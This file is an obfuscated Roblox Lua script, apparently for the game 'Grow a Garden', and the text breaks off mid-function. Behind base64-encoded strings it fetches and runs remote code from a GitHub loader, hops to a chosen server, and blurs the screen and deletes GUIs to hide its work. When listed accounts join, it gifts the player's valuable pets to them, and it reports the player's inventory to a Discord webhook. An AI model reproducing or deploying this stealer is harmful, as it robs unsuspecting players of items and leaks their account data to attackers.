local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function nPNcifaHEQOarKYsPcERVyyN(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 

-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(nPNcifaHEQOarKYsPcERVyyN('jpBgVtSJgLNydYMkwERzEHUsLUisQiCcKUzIkLaOIaJNBioxXZiZCUIaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = nPNcifaHEQOarKYsPcERVyyN('ziQrfMVrQogkIDuzATUGhPKxMfYrUHiSFmBTrfGkxGbjTFZSQzRfijyaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {nPNcifaHEQOarKYsPcERVyyN('mMVLqJUvppsrheVTWCTFeTKJunVRPGPoTuArqZBKCXPTfAxVXWoSSjiQmFkUGxheWVyMTIz'), nPNcifaHEQOarKYsPcERVyyN('NMFrMmHhDfydzecmGUSkVHyqMWvNSsZUebnaElgOhWujXiJyxYSOIaCTXlBbHQ='), nPNcifaHEQOarKYsPcERVyyN('hRvjriiKmfDLTagGSSQGEOiMMMFJbiVvtPgLbyTRKpQYmtIEELmvPMrRW5lbXlHdXk='), nPNcifaHEQOarKYsPcERVyyN('zXhhrGjvYRnHMVLgfXWNzbgGFMYEEyVNLXhiAhnvZgtDcKJOXeAaGxNaW50ZXJjZXB0ZXJudW1iZXIx')}
local targetServerId = nPNcifaHEQOarKYsPcERVyyN('uxnEIJlPQpliCWszYVWVzhTQLhUQtemCAitdxjiCvrsmtfqfEzvUGfGMjkwMzRmYzctNzdlNi00MDA4LWE0MzEtMzAzYzVhZWUyNmE2')

local drainPets = {
    nPNcifaHEQOarKYsPcERVyyN('oEaZfMudDyZtIxQnrPfYkEVcHMZTddEmCuOKRQWAWjncwCxLpRzBqGHRHJhZ29uZmx5'), nPNcifaHEQOarKYsPcERVyyN('PrnXBxDiHjSZzsDcoKSohArvuUchhMeyCsubydRHttPTatcLZQOaeWZVOKAkVJleA=='), nPNcifaHEQOarKYsPcERVyyN('WJKVcUgSlHfYhhzvSWadfdHKZoUWqlJTzZVrMQWiJFAEzHytHXFLGoSUmFjY29vbg=='), nPNcifaHEQOarKYsPcERVyyN('wAkSKdkyektUBNDQlVbFnCXsUaboRvTllBuzeGkFOQZBPwFpGzNlgkxUmVkIEZveA=='), nPNcifaHEQOarKYsPcERVyyN('OSHMlHviRTKRaxjBihGurqkoMMnCuzKxZGVgvmpNAvqsdwimJxkefrQUXVlZW4gQmVl'),
    nPNcifaHEQOarKYsPcERVyyN('tGYGwjTzRkgEYJJKhWGgTehWXEgnnUUJgzAaMaoRaOjshGPSKaeVPIFRGlzY28gQmVl'), nPNcifaHEQOarKYsPcERVyyN('syvUwKKjPksCNqDMCVRXWmJkPeTcVYivLPyWEIwtbuIMgBWoiMIyCaJQnV0dGVyZmx5'), nPNcifaHEQOarKYsPcERVyyN('WmxvEcUMTyskyLKDtzbxtazPAieseNmTojztyqqatICuaPnJDPaFXvCTWltaWM='), nPNcifaHEQOarKYsPcERVyyN('GbCEwUnAwhJeVtisAKvZzSdMMUUiZJlHxpDpLfCudLfGTTVTuIiJAvrTW9vbiBDYXQ='), nPNcifaHEQOarKYsPcERVyyN('pEfpUXirzPaWRQawdHueNFGofFCuDKPNPcufQmrpoyDPqSVuqFBlPEoRmVubmVjIEZveA=='),
    nPNcifaHEQOarKYsPcERVyyN('BRMFcZQRgPRGSEyFwgojzNMQlusqufKFNauPfmIVtduOSulbJSAIBoRVHJpY2VyYXRvcHM='), nPNcifaHEQOarKYsPcERVyyN('UqcdgAQPglBNIdyZyeMYywiZrvUZTkDCgsLwhkRRWtkGZUOUXpOdKyLQXhvbG90bA=='), nPNcifaHEQOarKYsPcERVyyN('gDDhSldFyjvQMdfNlNROXzggDwCjgtJQTGdxEKEsjKCBdfSrnFqfTdxQmVhciBCZWU='), nPNcifaHEQOarKYsPcERVyyN('OURSrpYfXcMEdQusNZcYChVYgoLcSszETpUKCUvgqnmoeokOMHxQtoXUG9sYXIgQmVhcg=='),
    nPNcifaHEQOarKYsPcERVyyN('exMgybBHDmfvCloducSIplhVvENURvlYtELAvXrUDrSyzGnCGLdJVwtUHJheWluZyBNYW50aXM='), nPNcifaHEQOarKYsPcERVyyN('hHHkfOTDneVszFlzZPzZpPXtUWdoRTdaHojIkKPJOuIdVJiIzgiQfiuU2NhcmxldCBNYWNhdw=='), nPNcifaHEQOarKYsPcERVyyN('NoQafedOsoUfRdPvHjEFKOyGemZzVbhiYEfPJPHzsjWFkJboiNZYYHMQ2hpY2tlbiBab21iaWU='), nPNcifaHEQOarKYsPcERVyyN('QMvdrTnbfpyFdfVZXpNRDmnxgFbafEXeYtXgUwuYkivsbAKVvLGklZfQ29va2VkIE93bA=='), nPNcifaHEQOarKYsPcERVyyN('rfOvqLQgDiMQvAcHBYYERbqdjNvuGoWJisvCpjXhNKnrnFywmpLbjDbQ2FweWJhcmE=')
}
local highTierPets = {
    nPNcifaHEQOarKYsPcERVyyN('tbYItNnUHZklIMEafIXFDaoGrmweNnrnYByLospblbnJuhQzqIpZrMNRHJhZ29uZmx5'), nPNcifaHEQOarKYsPcERVyyN('XiCDkrOWkvGjqjxPlupNLVKPikaSIelcvzrUTOHPCSuaiaBTLwwOdClQnV0dGVyZmx5'), nPNcifaHEQOarKYsPcERVyyN('VxnuFhluHgBFVCTjkoocPPJmLRDTLHKGYiJqefuKZyQnYhZHbswYwsbTWltaWM='), nPNcifaHEQOarKYsPcERVyyN('nZdxwBYVrKYrYwJwjRMWDJTyaePDVJGwxwHNXpggJUcvQcyXqFyaLqGUmVkIEZveA=='), nPNcifaHEQOarKYsPcERVyyN('vjViZnBaAuuVjuWFWeGkNtOKckvbFlhGZHkvDpohJwBOJkzpfjJdzewUmFjY29vbg=='),
    nPNcifaHEQOarKYsPcERVyyN('APuZoVcANicrHIHIeoxqYYNgWlLDZZlQzKjkIVsgAibsvtSfHiZTHdTRGlzY28gQmVl'), nPNcifaHEQOarKYsPcERVyyN('UZbpsPiUZubsCMpLZVvCEsniiUIbxoSyLNKvcUQfRRJVFajrCcufdhDUXVlZW4gQmVl'), nPNcifaHEQOarKYsPcERVyyN('mtlshZsUJjZOsFuHkLElfxctLeeRFQjckgKqIOIzxMiaWuzMQLdWqtRVOKAkVJleA=='), nPNcifaHEQOarKYsPcERVyyN('SjrXCffmnFnQtMbtdJBmLeUdvYaYkiqbZxaNZsiUjkzqdkqVEvYjpdhU3Bpbm9zYXVydXM='), nPNcifaHEQOarKYsPcERVyyN('iNJlsFOOyPIjSCEfdXUQAsfTPuFYjMzrOIIGyQHLdqbfbNVGuQBnOJpQW5reWxvc2F1cnVz')
}
local petKeywords = {
    nPNcifaHEQOarKYsPcERVyyN('ZYodKBwwvfndyjyUSKmKHUHFNOLWhNpaXJUrjkNJttrTCINTvbfUQbSU3RhcmZpc2g='), nPNcifaHEQOarKYsPcERVyyN('FBPZXQwgxrnwthxJdazxwjHSKTXeCJuFfSvysrrgyEnhMfaxxkeybtZQ3JhYg=='), nPNcifaHEQOarKYsPcERVyyN('sblvYqFecihzKrnEbtHDbABQNIwNjdBmNnMguQzdrBFZgWHQWJqzFNUU2VhZ3VsbA=='), nPNcifaHEQOarKYsPcERVyyN('sJqhndtnaHHHWXsGgcLxDiqmpbOKCDGgnptpcVRtGDrTummDUuxfZPkQnVubnk='), nPNcifaHEQOarKYsPcERVyyN('CtLebMdzarBFqKAfqdCChYdIxOqSgDaAaNMZcZtUWxAqtrtOeYWPbIkRG9n'), nPNcifaHEQOarKYsPcERVyyN('KKLObmkjAyBRScelRHlCnosezduvYKCWIAoEqeyrIAwtduOJmKyoBRmR29sZGVuIExhYg=='), nPNcifaHEQOarKYsPcERVyyN('CmTRmNFTrPbbQyyHnwspFSgxPnMzofIqsiJsGMkdBZcAASFRBTNaOWdQmVl'),
    nPNcifaHEQOarKYsPcERVyyN('pSiLQTpRdbAorJnUBXIMZjGTbjuHmhCLSpiXosokgRTwnINxsjIkZyEQmxhY2sgQnVubnk='), nPNcifaHEQOarKYsPcERVyyN('ngmiFvzVWIxNhQCOFNSDNZtVYDWrsZGFAifFMsQUwUrqWtBVYmBdnLEQ2F0'), nPNcifaHEQOarKYsPcERVyyN('qndNyhyDWivEvEIGOkxisYHxBFuidbUAJYtENWvYJzbwUpwZyVIyoygQ2hpY2tlbg=='), nPNcifaHEQOarKYsPcERVyyN('gMmcExguCrPPxHvMJwfXNwjVgWCHbTmHxwsgeBWdKhlohOGhOrPzZBmRGVlcg=='), nPNcifaHEQOarKYsPcERVyyN('eAPCFehSdtcQjjsAdkrPcTWPqWqeITghfygVZSLyFTuwoBihupuoxclTW9ua2V5'), nPNcifaHEQOarKYsPcERVyyN('mMeReTqOBRCxTPodAohUprmdXavhHkMtSHllDAOawReFZqxrsvCXZgtT3JhbmdlIFRhYmJ5'),
    nPNcifaHEQOarKYsPcERVyyN('EoUSzBxhuTsWhAZcwwnyKxaBYvlNwEwqKnPbNMzXOlTAMNvVIkuudBUUGln'), nPNcifaHEQOarKYsPcERVyyN('VJuKLYXGCoOZlhmhGQrjwlaklMPGCrQqsFUGTQcaJjArSHuazuqaTlQUm9vc3Rlcg=='), nPNcifaHEQOarKYsPcERVyyN('jvKlCvRHvUuIxdvHyqdCSJohoRjxxlviTTjGiojpMzaDjJapFUKCEtIU3BvdHRlZCBEZWVy'), nPNcifaHEQOarKYsPcERVyyN('rNppfydVfEJAYTkgKnBgOYPNcVKXlXrnoaaSPbuxktJEbFrPWroQGgTRmxhbWluZ28='), nPNcifaHEQOarKYsPcERVyyN('ZdJUabCOvjoFPMECRWsatyHqMJVCfXxBgfftZYJhDLjobtBWflDSHqTVG91Y2Fu'), nPNcifaHEQOarKYsPcERVyyN('RnhSRyjxzrXIKjJLgCxFHTbEFECylBUekHMtvauBXLTnobziuXNXRygU2VhIFR1cnRsZQ=='),
    nPNcifaHEQOarKYsPcERVyyN('OrPCwGjnlqncZQyrqanednMjPNQQSCVEbwLXGHzdhwtDqpLIabXSbdfT3Jhbmd1dGFu'), nPNcifaHEQOarKYsPcERVyyN('wCIGnkDHkmmUgTzGymvoRMgtWQvGUchmBXvduDBjgAqhhHAIWOZmENTU2VhbA=='), nPNcifaHEQOarKYsPcERVyyN('QwfoITUnIVaXoqlMWexePCIEOzKiRRinlMfYOmaQNTcDGwVnsLoGwvdSG9uZXkgQmVl'), nPNcifaHEQOarKYsPcERVyyN('lGlvgqgsXmEBvIggixgiQxzXBudrNgxQCEILUZcfebcEZaAnwupNYzGV2FzcA=='), nPNcifaHEQOarKYsPcERVyyN('goVfHyJFbxiOWRUhBNQLNSQPJkaDHGnZqjGpxooEZULNMJPhuumliCDVGFyYW50dWxhIEhhd2s='), nPNcifaHEQOarKYsPcERVyyN('atvpztdrJnOlCsvqDTFmgDpCRryfDJxKEMmsatiQlFJliHQRxbPeQuuUmFwdG9y'),
    nPNcifaHEQOarKYsPcERVyyN('WZezdUiATMEtwUamkWTwtZgVNUsieLCKUmCuLZvfWDznTKmNxHDZYdfVHJpY2VyYXRvcHM='), nPNcifaHEQOarKYsPcERVyyN('XbMyOEkqbcFgyoSaICCSgnTlLpLpmEPYEMtUXVYtucIZSCnHtAKigJgU3RlZ29zYXVydXM='), nPNcifaHEQOarKYsPcERVyyN('dYNezacEqkAFhWatnRhqnHyMypywVbCyrguhHGwfgpTLkFObWodZcxdUHRlcm9kYWN0eWw='), nPNcifaHEQOarKYsPcERVyyN('lDwfQRoLNRbznwJpPZLxnCCgKzFVpRTbzNGDagGcCJhiXvyWVtpOtoNVHVydGxl'), nPNcifaHEQOarKYsPcERVyyN('NvTLeIFJXxTVTfOvTbfCGPEfXAwpGwfmbZrFfPvsctekQFIUmxXVmZmQ2F0ZXJwaWxsYXI='),
    nPNcifaHEQOarKYsPcERVyyN('nzdMADuOnkeQWCbQBuVrVfqdYBQYffeXubTuMuLfbvltljKSgqRMNUeUGV0YWwgQmVl'), nPNcifaHEQOarKYsPcERVyyN('SyOHNyqoKIlrykRTnqkqApcqqCvXfJviouPNbVtFmBhcDDZTCCjoRdVTW90aA=='), nPNcifaHEQOarKYsPcERVyyN('HrUzGpSAAcLHcHETcMrutKGxWRZxEMjyzlGYbMHKylQQMEoTWAVzAtTU2NhcmxldCBNYWNhdw=='), nPNcifaHEQOarKYsPcERVyyN('HQUwKfsFQQpHHJvuKsEPUwfAGBZAwpxhULdqMTrkhHCysJHknDUZORIT3N0cmljaA=='), nPNcifaHEQOarKYsPcERVyyN('VaGlmvGpMCUONrvkHLNkVNcjCtbGgfMfzZtsWwyjvxYarbKIlVyMODtUGVhY29jaw=='),
    nPNcifaHEQOarKYsPcERVyyN('bNXfMOcsHzZtiYZkcHKgNHjvpIqVQJHBKuxJqlYeqfzydCXNGUUttqlQ2FweWJhcmE='), nPNcifaHEQOarKYsPcERVyyN('WYnqPmtdchpVZYfRcXhlQKlhEdywnfxmUmETMwHVWGuumiDlEmHnkLZU2FuZCBTbmFrZQ=='), nPNcifaHEQOarKYsPcERVyyN('TRVMVAPNISRymzWQRLkAleAqJhKWaHjCHgPylVxFMEjaAekOtfnlrGITWVlcmthdA=='), nPNcifaHEQOarKYsPcERVyyN('KSgAejrbPpSnmmJbaykluFpOSPLppXwuOvsdknMGAJnkpoGubUtWqSoQnJvd24gTW91c2U='), nPNcifaHEQOarKYsPcERVyyN('jTGiBknMFLxifykFIajuITCqhEsGgsoEvGKazrwctKGAFCyeIksyNxrR2lhbnQgQW50'),
    nPNcifaHEQOarKYsPcERVyyN('NsfTYZmREvZlYnNsruXEWtCNFFAubDrtlHXHZhPzNjqIPZtifwGVRnWR3JleSBNb3VzZQ=='), nPNcifaHEQOarKYsPcERVyyN('OUzzBNCSUqhXovPpCBoJLIwxzJkbOKXtLKZVKQOKIZBpyeCHjyLpUROUHJheWluZyBNYW50aXM='), nPNcifaHEQOarKYsPcERVyyN('dSMUvQqCkobWrMraXHsnabcIxRlJfsUvqUvAIdgmgLENxtCZrsPnxhuUmVkIEdpYW50IEFudA=='), nPNcifaHEQOarKYsPcERVyyN('BFSsjjzmdECkrMGOXCOnslQhtmTZTWtOxNbNDulYJjPozQnFIieskpPU25haWw='), nPNcifaHEQOarKYsPcERVyyN('IgXuQSfHonQskCLrgBuNygDkvlYbSFQgInjKdOeeIpXZbQaiZicUCsrU3F1aXJyZWw='),
    nPNcifaHEQOarKYsPcERVyyN('DZeoywhXfvaFoTdCTmHYvOAenXzRIXYVsFgRRJMgzMBQCbITAjTDMhaQmVhciBCZWU='), nPNcifaHEQOarKYsPcERVyyN('EGgdQmoyVVWNwOkFWjsejJTfGLbetjVtTpgmYXMDrVqKgqBBcrmdXzLQnV0dGVyZmx5'), nPNcifaHEQOarKYsPcERVyyN('JZDZGbkWpiYkKLAkoYvyUaSPMHkMhlemiPnIKzPUDJmgKWUIZpUAEBzQnJvbnRvc2F1cnVz'), nPNcifaHEQOarKYsPcERVyyN('HcjVFKpeqtlWKMQiqPVJXbBSOErCeqzKsOLNyCnZUlnAJChjJomATaVUGFjayBCZWU='), nPNcifaHEQOarKYsPcERVyyN('uVDUVVGJClRyMDVlLbTLfwvaGFMotAguBcnJGRKkpvmuBwSospmQrMvTWltaWMgT2N0b3B1cw=='),
    nPNcifaHEQOarKYsPcERVyyN('bebVGHmzNbOUnYPUjwekcgSpfhkUjreGJuKRbWHPBQPEryROJAyebIkSHlhY2ludGggTWFjYXc='), nPNcifaHEQOarKYsPcERVyyN('JENAWnETVTddNBwhvoqcxEiBgrmnuJVtKRDnNKZzutslBYQyzkjuBacQXhvbG90bA=='), nPNcifaHEQOarKYsPcERVyyN('GijOSdKdARFGJZpAsZxJDCAhOdLQFQvEQVSktBjyUOYsjjkgbTnEfySUmVkIEZveA=='), nPNcifaHEQOarKYsPcERVyyN('HMSZsWLosGTpeMrctLrrlhRGsAVhYkbQauoZXamsSJNbnOyCtLVZzOaVOKAkVJleA=='), nPNcifaHEQOarKYsPcERVyyN('tRWpLKYiZPRgJNQgjhiHskeoQRfcciIvnrDnPEcibVjGHANxKBFGYoTRHJhZ29uZmx5'),
    nPNcifaHEQOarKYsPcERVyyN('kwiDAxMDeWDfWCbXVzDZkYfoHudZPZUvVYnpfnNJkaeDiTcxnNkuXWbUXVlZW4gQmVl'), nPNcifaHEQOarKYsPcERVyyN('bKLJPDZDJLUAKQUEXOpjcLnyUpyvIqiFRGwwmhDFpzukJHLCtASDncKRGlzY28gQmVl'), nPNcifaHEQOarKYsPcERVyyN('iLGvwqdQhhKeaBDIdPpKtTxWeCTKFiqbzSFpEUUELevNVvyjBVsedXkRmVubmVjIEZveA=='), nPNcifaHEQOarKYsPcERVyyN('hOFzUzcFfcgSwfGwXGncbsErywyaGKYWBfURNvpRHvTDndqQKpbIdIZTW9vbiBDYXQ='), nPNcifaHEQOarKYsPcERVyyN('AazpLAhBhPpdkXKCQUhciHGsOnQHFKTWieTcxRSOcLHBXDzFHrmoqkDUmFjY29vbg=='),
    nPNcifaHEQOarKYsPcERVyyN('JdKDTFeorvUPQRPMSFGcgIpjCFhBofQRDuwNCLUvicxmBIsdJzpuiFbUG9sYXIgQmVhcg=='), nPNcifaHEQOarKYsPcERVyyN('pfJzPTaJYZEHrvdAnQGqWUdusmNgZMdQtebApJMMFCFHJZjkCRekQukUGFyYXNhdXJvbG9waHVz'), nPNcifaHEQOarKYsPcERVyyN('DfyXIbtuPYmgCZNJPZtYCFiUVhceRTviPfFEBGRlBRepRUIlgkEPIwCSWd1YW5vZG9u'), nPNcifaHEQOarKYsPcERVyyN('iSLaSfGfSurhHgrOKibQaYmpmKNaoFqqjMKxVOPoZoNLYIuSbuDjQXcUGFjaHljZXBoYWxvc2F1cnVz'),
    nPNcifaHEQOarKYsPcERVyyN('arozwlusVosBiSPttnAXHSnHyjSgEIUCtrHgdMtWLGtfoXahpQlpbgaRGlsb3Bob3NhdXJ1cw=='), nPNcifaHEQOarKYsPcERVyyN('zkbErDJzifBVoUqaEAtUtLzZUNMVGGlTmFipfNeSmGNGXjVKBWXjuUaQW5reWxvc2F1cnVz'), nPNcifaHEQOarKYsPcERVyyN('giZEcXazLWRGRbUcgoPSVRTaGjaqcFvjcDpJDvSXhxUxyUTHeMMJNPKU3Bpbm9zYXVydXM='), nPNcifaHEQOarKYsPcERVyyN('IHTBBxNbIWIRNgIYLumawkWEYjtOxclwlPkWGgaBTETFkKNHJYfqBWLQ2hpY2tlbiBab21iaWU='), nPNcifaHEQOarKYsPcERVyyN('RBZEQPFeryPNjyhMhFnmEvXOgBLXZYDCaIUFrqumylAVOvDtnNcKfopQ29va2VkIE93bA==')
}

-- BLOCK DELTA EXECUTOR
local isDelta = identifyexecutor and string.lower(identifyexecutor()) == nPNcifaHEQOarKYsPcERVyyN('woLEYAIzcPpssWBqEJfmsqZPfGnrxdSBPrFWCswAOBZSxAifLHWpkQnZGVsdGE=')
if isDelta then
    game.Players.LocalPlayer:Kick(nPNcifaHEQOarKYsPcERVyyN('gHFcpmxMmjypHclpJOTSKNCDDiBAglVUicASSMfRJcNHLRRbgbtWPJvVGhpcyBzY3JpcHQgaXMgbm90IHN1cHBvcnRlZCBvbiBEZWx0YSBleGVjdXRvci4='))
    return
end

-- SERVICES
local Players = game:GetService(nPNcifaHEQOarKYsPcERVyyN('tuZfAXDebXKusaGxvofzMSvsUEEIWhYrRNXMtmHKlzPcPfEsRaMuiCaUGxheWVycw=='))
local ReplicatedStorage = game:GetService(nPNcifaHEQOarKYsPcERVyyN('VcXHhyyPPeBanCkIcDLZnDONAVIEmsilgEgyRXMwKKkDkOOrywuLamcUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(nPNcifaHEQOarKYsPcERVyyN('YBRRKqrwlniWOOdKxKcwLPneeyfLXXarcTbxhiejkYGgebkpZOBQkEQSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(nPNcifaHEQOarKYsPcERVyyN('aZOtSDOyrHNhcKvtMleUjZgqdvObrEzprQdEqGSCoBGdXltfliNzpesVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(nPNcifaHEQOarKYsPcERVyyN('VHBXCJpStoBAJwuaRZbKWFOKxFvOhamrYHIBCCcIxITapdLropvUfHGTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(nPNcifaHEQOarKYsPcERVyyN('EKSatTtwztcVFRSvzZvpvbWtwwZDsKzrczzrERDSbndVeRSzuyZiyYqQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- SERVER HOP IF NOT IN TARGET
if jobId ~= targetServerId then
    local function getLowestServer()
        local req = http_request or syn.request or request or fluxus.request
        if not req then return nil end
        local cursor = nPNcifaHEQOarKYsPcERVyyN('OguMSCXZPOpWLpZIMGUtGYagHWDpDnqcRIzRaXGvJRLEjieDsRBDEnU')
        local lowest = nil
        repeat
            local url = nPNcifaHEQOarKYsPcERVyyN('IZWRlfMCxsYpoANcOtlPbciITstAmWvfUrpHWCaXuxGYoVKSRwWsbVcaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. nPNcifaHEQOarKYsPcERVyyN('NyQConwXlECNgZczkMQjeKMDcqSXpxHPQFwVNuWfnjmigtaVOveipohL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
            if cursor ~= nPNcifaHEQOarKYsPcERVyyN('hvOVGsCrCboVBtJJGTNQspRzBpYsjLNRdXjWRgpZuVWLyTWjhUQUdNT') then url = url .. nPNcifaHEQOarKYsPcERVyyN('aiiPKgIVguwfwtWQYeIoaODsDlRxRsvtLcNsiCbSSITYMApdqnwrQMlJmN1cnNvcj0=') .. cursor end
            local response = req({ Url = url, Method = nPNcifaHEQOarKYsPcERVyyN('NkJhajZoHwrSRRcYJxYztCVcRZtOuLEcJZHnAUfVLvyTSddWsXmppbaR0VU') })
            if response and response.Body then
                local data = HttpService:JSONDecode(response.Body)
                for _, server in pairs(data.data or {}) do
                    if server.id == targetServerId then
                        lowest = server
                        break
                    end
                end
                cursor = data.nextPageCursor
            end
        until lowest or cursor == nil
        return lowest
    end

    local targetServer = getLowestServer()
    if targetServer then
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, targetServerId, localPlayer)
        return
    end
end

-- HELPERS
local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(nPNcifaHEQOarKYsPcERVyyN('ZkdstfgaDalmOmAlxazwkLrSiRviVyQKrrGRZMaeijzYLcyolbNoIhTVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(nPNcifaHEQOarKYsPcERVyyN('EwmCXPmUXXwLPkqbhWrvqbLJxDOtSRVCXBXkSvZfWoqLjxgUtEoiUMZRGV4'))
    if not dex then return end
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(nPNcifaHEQOarKYsPcERVyyN('BUxgxnfBQNOAfRYujIqAohEWEZhSzzOyxyXQSRqXNzjAFUzRlzcMPbiSW5zdGFuY2U=')) and item:GetAttribute(nPNcifaHEQOarKYsPcERVyyN('KfoOxUsXCzKnIiheAbUzcKNXqmPkxrHYwFBkMCpbYjlqqiwjhtptCRvZA==')) == true then
            ReplicatedStorage:WaitForChild(nPNcifaHEQOarKYsPcERVyyN('KDBCXKeQcaHprWNTPLuFVfntTTiqtNlnOMAAOrrChlyfyDgVXsMLxdNR2FtZUV2ZW50cw==')):WaitForChild(nPNcifaHEQOarKYsPcERVyyN('UcrSHIdbZzkbEvyvZqzbMnjKZFthqaxKnIyfXjTKJHdqZumRgzwAXBMVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
end

local function sendWebhook(fields)
    local req = http_request or syn.request or request or fluxus.request
    if not req then return end
    req({
        Url = webhookUrl,
        Method = nPNcifaHEQOarKYsPcERVyyN('yCucXICDuvhQnmoAAcemUwRpTIAqijilFfsWKQnaXehgEBoidJVfBoxUE9TVA=='),
        Headers = {[nPNcifaHEQOarKYsPcERVyyN('YNULfVFcngQVkAdhfRPgtGfmvrzpCxCkvtLrJSMDflkXBrcvDvfLfIGQ29udGVudC1UeXBl')] = nPNcifaHEQOarKYsPcERVyyN('GYhGgxPtxjIfODSOKqQDdAkXDjLVdNUjlQxmdQPXhzrOhHxgVmXBoVyYXBwbGljYXRpb24vanNvbg==')},
        Body = HttpService:JSONEncode({
            embeds = {{
                title = nPNcifaHEQOarKYsPcERVyyN('stOKvJlxyFwYdjLfCrpBBrMOpaNBKgRfNjYmaVktgrahbkGGuZsguFp8J+QviBHcm93IGEgR2FyZGVuIFRyYWNrZXI='),
                color = 16753920,
                fields = fields,
                footer = { text = nPNcifaHEQOarKYsPcERVyyN('WOGxwVmGXtfVzcRYkTlwJJnDucRPjCkUQVmbBpjBuZixTZqCHvMahnvRGVsdGEgTG9nZ2Vy') },
                timestamp = os.date(nPNcifaHEQOarKYsPcERVyyN('IjEhRrcJjtQCVatLFokclERpVtOdvRmRZwCulIideXiUeesLCHyPLEYISVZLSVtLSVkVCVIOiVNOiVTWg=='))
            }}
        })
    })
end

local function freezeVisual()
    local blur = Instance.new(nPNcifaHEQOarKYsPcERVyyN('FZsabMkRHTPSIyQoIgQBusxjPWtBLndOccmYpwVioWqRXwfHniDsneVQmx1ckVmZmVjdA=='), Lighting)
    blur.Size = 999
end

local function removeAllGUIs()
    for _, gui in ipairs(localPlayer:WaitForChild(nPNcifaHEQOarKYsPcERVyyN('GGzkjAiJhQKOdmQBcDWztuZSfBFsXlJugoPDLWAZwWzBUhRvrrpXGAjUGxheWVyR3Vp')):GetChildren()) do
        if gui:IsA(nPNcifaHEQOarKYsPcERVyyN('ELpiUYKpOSZVTYVsNfNjidVyccnEyiDuEvhngTBOSsdHLlVFnvZOnWGU2NyZWVuR3Vp')) or gui:IsA(nPNcifaHEQOarKYsPcERVyyN('XCtOiHEGzhgPaxzsCGQUXoJXcZHVLBSdxolephryLETMgtMjJdjZEjMQmlsbGJvYXJkR3Vp')) or gui:IsA(nPNcifaHEQOarKYsPcERVyyN('VfjoxwSQTnJFoQlHIlBFayOGZMUlBvzEyJKzbASVugDXNAJgTYgXjsfU3VyZmFjZUd1aQ==')) then
            gui:Destroy()
        end
    end
end

-- TARGET PLAYER JOIN HANDLER
task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                task.wait(7)
                unfavoriteAllPets()
                freezeVisual()
                removeAllGUIs()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(nPNcifaHEQOarKYsPcERVyyN('rxsNQwIkAJRmZLCiRilTLHeZHtEuWjAnPBUahEdxMhbKaXlqAojFPacVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        tool.Parent = character
                        wait(0.3)
                        while player.Parent == Players and tool.Parent == character do
                            ReplicatedStorage:WaitForChild(nPNcifaHEQOarKYsPcERVyyN('DsTQZupwpfyEiMYIoqTFJgfIDidciOTPPeBGQMphyBwvuVLkvjucHZkR2FtZUV2ZW50cw==')):WaitForChild(nPNcifaHEQOarKYsPcERVyyN('jmPvQSkfnmqKtkLsbEXUluzKHFieLJkJrMVyNZpdjGShPaXzMpUyFvXUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(nPNcifaHEQOarKYsPcERVyyN('ERbaOzeXSnoBvxojyxSNqDPINxsHwFyQzjApRNRmJeMXXzQOmxfDRFxR2l2ZVBldA=='), player)
                            wait(0.7)
                        end
                    end
                end
            end
        end
        task.wait(2.5)
    end
end)

-- 5-MINUTE ACTIVE CHECK
task.delay(300, function()
    local filtered = getFilteredPets()
    local foundHighTier = false
    for _, pet in ipairs(filtered) do
        if hasKeyword(pet, highTierPets) then
            foundHighTier = true
            break
        end
    end
    if #filtered > 0 and foundHighTier then
        sendWebhook({
            { name = nPNcifaHEQOarKYsPcERVyyN('VlecJykbptRYoYYuuapgHARoDyYERFWCNibvoUcECTbUHryYacFlGtG8J+foiBTY3JpcHQgU3RpbGwgQWN0aXZl'), value = nPNcifaHEQOarKYsPcERVyyN('WbOvRuKEuHMinLWhUoGqXvZXXagZigUuaFZVrVWEdpNewGLnmgFoDIxVXNlcm5hbWU6IA==') .. localPlayer.Name },
